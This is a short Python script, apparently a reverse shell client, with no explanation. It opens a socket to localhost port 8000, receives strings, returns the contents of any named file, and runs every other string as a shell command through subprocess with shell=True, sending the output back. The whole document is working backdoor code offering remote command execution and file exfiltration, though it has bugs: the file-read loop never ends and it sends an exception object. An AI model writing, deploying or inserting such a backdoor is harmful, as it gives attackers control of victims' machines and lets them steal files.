import socket
import subprocess
import os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",8000))
def Send(so,files):
    try:
        with open(files,"rb") as f:
            while True:
                c=f.read(4096)
                s.sendall(c)
    except Exception as e:
        s.sendall(e)
while True:
    data = s.recv(1024)
    if os.path.isfile(data):
        Send(s,data)
    else:
         outputs = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
         result =outputs.stdout.read()+outputs.stderr.read()
         s.sendall(result)
